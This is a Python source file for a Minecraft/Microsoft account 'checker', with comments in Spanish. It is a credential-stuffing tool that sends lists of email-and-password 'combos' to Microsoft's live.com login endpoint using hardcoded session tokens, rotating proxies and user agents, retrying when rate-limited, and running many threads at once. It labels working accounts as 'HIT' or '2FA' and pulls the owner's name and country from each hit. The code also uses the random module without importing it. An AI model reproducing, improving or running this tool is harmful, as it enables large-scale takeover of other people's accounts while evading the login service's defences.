# checkers/minecraft.py
import requests
import threading
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

class MinecraftChecker:
    # ===== USER AGENTS =====
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]

    @staticmethod
    def _random_user_agent():
        """Genera un User-Agent aleatorio"""
        return random.choice(MinecraftChecker.USER_AGENTS)

    @staticmethod
    def _format_proxy(proxy):
        """Formatea el proxy para requests"""
        if not proxy:
            return None
        proxy = proxy.strip()
        if proxy.startswith(("http://", "https://")):
            return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{proxy}"

    @staticmethod
    def check(email: str, password: str, proxy: str = None) -> dict:
        """
        Verifica una cuenta de Minecraft (Microsoft)
        Retorna: {'status': 'HIT'|'2FA'|'INVALID'|'ERROR', 'email': str, 'password': str, 'message': str}
        """
        proxy_url = MinecraftChecker._format_proxy(proxy)
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        # ===== URL Y PARÁMETROS =====
        url = "https://login.live.com/ppsecure/post.srf"
        
        params = {
            'nopa': "2",
            'client_id': "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
            'cobrandid': "8058f65d-ce06-4c30-9559-473c9275a65d",
            'contextid': "F3FB0F6AB3D6991E",
            'opid': "5F188DEDF4A1266A",
            'bk': "1768757278",
            'uaid': "b1d1e6fbf8b24f9b8a73b347b178d580",
            'pid': "15216"
        }

        # ===== PAYLOAD =====
        payload = {
            'ps': "2",
            'psRNGCDefaultType': "",
            'psRNGCEntropy': "",
            'psRNGCSLK': "",
            'canary': "",
            'ctx': "",
            'hpgrequestid': "",
            'PPFT': "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
            'PPSX': "P",
            'NewUser': "1",
            'FoundMSAs': "",
            'fspost': "0",
            'i21': "0",
            'CookieDisclosure': "0",
            'IsFidoSupported': "1",
            'isSignupPost': "0",
            'isRecoveryAttemptPost': "0",
            'i13': "0",
            'login': email,
            'loginfmt': email,
            'type': "11",
            'LoginOptions': "3",
            'lrt': "",
            'lrtPartition': "",
            'hisRegion': "",
            'hisScaleUnit': "",
            'cpr': "0",
            'passwd': password
        }

        # ===== HEADERS =====
        headers = {
            'User-Agent': MinecraftChecker._random_user_agent(),
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Cache-Control': "max-age=0",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'Origin': "https://login.live.com",
            'Upgrade-Insecure-Requests': "1",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx&flowtoken=-Dlvz*VDmPVZZLUB5XJxsfDMTTcQljOxDsdPjDKzToqZjduHY6H8mvZDBmfh64KLbJ2nZ9eoEak3Z5i9cv6QnWc1AgKNCTVjbsdSkMM2udkvn*tMhRNlP*KMzWSv4xope0Tedsx0fH4ExWXxj47d!shbqu5cb72XzFK*iJMoesP5oeS*!QeCOp1srGs2ds7c0wcllXOmhW9BF5JvWeVnY4ggTVh*w4TUyV!keqrvHLOJZENELnYgCp5EjzPwdp2QPhnupdnWEyUzkQIzzXeB0HN4BAZJhJpQo3U8Hd3J4Z16oG7vbJZEpdHLpaxVe7RfSvg%24%24&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&opid=5F188DEDF4A1266A",
            'Accept-Language': "en-US,en;q=0.9",
        }

        try:
            # ===== ENVIAR REQUEST =====
            response = requests.post(
                url, 
                params=params, 
                data=payload, 
                headers=headers, 
                proxies=proxies,
                timeout=20,
                verify=False
            )

            response_text = response.text.lower()
            status_code = response.status_code

            # ===== VERIFICAR STATUS CODE =====
            if status_code >= 500:
                return {
                    "status": "ERROR",
                    "email": email,
                    "password": password,
                    "error": f"HTTP {status_code}"
                }
            elif status_code == 429:
                return {
                    "status": "ERROR",
                    "email": email,
                    "password": password,
                    "error": "Rate limited"
                }
            elif status_code != 200:
                return {
                    "status": "ERROR",
                    "email": email,
                    "password": password,
                    "error": f"HTTP {status_code}"
                }

            # ===== VERIFICAR 2FA =====
            two_fa_indicators = [
                'suggestedaction', 'sign in to continue', 'enter code',
                'two-step', 'two. step', 'two factor', '2fa', 'second verification',
                'verification code', 'authenticator', 'texted you', 'sent a code',
                'enter the code', 'additional security', 'extra security'
            ]
            if any(indicator in response_text for indicator in two_fa_indicators):
                return {
                    "status": "2FA",
                    "email": email,
                    "password": password,
                    "message": "Requiere autenticación de dos factores"
                }

            # ===== VERIFICAR ÉXITO =====
            success_indicators = [
                'to do that, sign in', 'welcome', 'redirecting',
                'location.href', 'home.live.com', 'account.microsoft.com',
                'myaccount.microsoft.com', 'profile.microsoft.com',
                'https://account.live.com/', 'microsoft account home',
                'signed in successfully', "you're signed in"
            ]
            if any(indicator in response_text for indicator in success_indicators):
                # ===== OBTENER MÁS INFORMACIÓN =====
                country = "Unknown"
                name = "Unknown"
                
                try:
                    # Buscar información en la respuesta
                    name_match = re.search(r'"firstName":"([^"]+)"', response.text)
                    if name_match:
                        name = name_match.group(1)
                    
                    country_match = re.search(r'"country":"([^"]+)"', response.text)
                    if country_match:
                        country = country_match.group(1)
                except:
                    pass

                return {
                    "status": "HIT",
                    "email": email,
                    "password": password,
                    "name": name,
                    "country": country,
                    "is_premium": True
                }

            # ===== VERIFICAR CREDENCIALES INVALIDAS =====
            failure_indicators = [
                'invalid username or password', "that microsoft account doesn't exist",
                'incorrect password', 'your account or password is incorrect',
                'sorry, that password isnt right', 'entered is incorrect',
                "account doesn't exist", 'no account found', 'wrong password',
                'incorrect credentials', 'login failed', 'sign in unsuccessful',
                "we couldn't find an account", 'please check your credentials'
            ]
            if any(indicator in response_text for indicator in failure_indicators):
                return {
                    "status": "INVALID",
                    "email": email,
                    "password": password,
                    "message": "Credenciales inválidas"
                }

            # ===== VERIFICAR CUENTA BLOQUEADA =====
            blocked_indicators = [
                'sign-in was blocked', 'account is locked', 'suspended',
                'temporarily locked', 'security challenge', 'unusual activity',
                'verify your identity', 'account review', 'safety concerns'
            ]
            if any(indicator in response_text for indicator in blocked_indicators):
                return {
                    "status": "INVALID",
                    "email": email,
                    "password": password,
                    "message": "Cuenta bloqueada"
                }

            # ===== RESPUESTA DESCONOCIDA =====
            return {
                "status": "ERROR",
                "email": email,
                "password": password,
                "error": "Respuesta desconocida"
            }

        except requests.exceptions.ProxyError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Proxy dead"}
        except requests.exceptions.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "ERROR", "email": email, "password": password, "error": "Connection failed"}
        except Exception as e:
            return {"status": "ERROR", "email": email, "password": password, "error": str(e)[:80]}

    @staticmethod
    def check_with_retry(email: str, password: str, proxy: str = None, retries: int = 2) -> dict:
        """Verifica con reintentos en caso de rate limit"""
        for attempt in range(retries + 1):
            result = MinecraftChecker.check(email, password, proxy)
            if result.get("status") != "ERROR" or "Rate" not in result.get("error", ""):
                return result
            if attempt < retries:
                time.sleep(2 + random.random() * 2)
        return result

    @staticmethod
    def process_batch(combos: list, proxies: list = None, threads: int = 10) -> tuple:
        """Procesa un lote de combos con threads"""
        results = []
        stats = {"hit": 0, "2fa": 0, "bad": 0, "error": 0, "total": len(combos)}
        
        proxy_index = 0
        proxy_lock = Lock()
        result_lock = Lock()
        
        def get_next_proxy():
            nonlocal proxy_index
            if not proxies:
                return None
            with proxy_lock:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                return proxy
        
        def check_combo(combo):
            email, password = combo
            proxy = get_next_proxy()
            return MinecraftChecker.check_with_retry(email, password, proxy)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_combo, combo): combo for combo in combos}
            for future in as_completed(futures):
                result = future.result()
                with result_lock:
                    results.append(result)
                    
                    status = result.get("status", "ERROR")
                    if status == "HIT":
                        stats["hit"] += 1
                    elif status == "2FA":
                        stats["2fa"] += 1
                    elif status == "INVALID":
                        stats["bad"] += 1
                    else:
                        stats["error"] += 1
        
        return results, stats